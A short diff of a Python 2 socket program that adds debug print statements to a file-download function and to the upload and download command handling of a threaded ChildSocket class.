@@ -166,8 +166,10 @@ def download(sock, filename, end="[ENDOFMESSAGE]"):
                 l = sock.recv(1024)
         with open(filename, 'wb') as _file:
             _file.write(received_data[:-len(end)])
+        print 'downloadDone'
         return 'downloadDone'
     except:
+        print 'downloadError'
         return 'downloadError'
 
 
@@ -297,6 +299,7 @@ class ChildSocket(threading.Thread):
                         filename = data.split(' ')[1]
                         stdoutput = download(self.socket, filename)
                     except:
+                        print 'uploadError'
                         stdoutput = 'uploadError'
                 elif data.startswith('download '):
                     try:
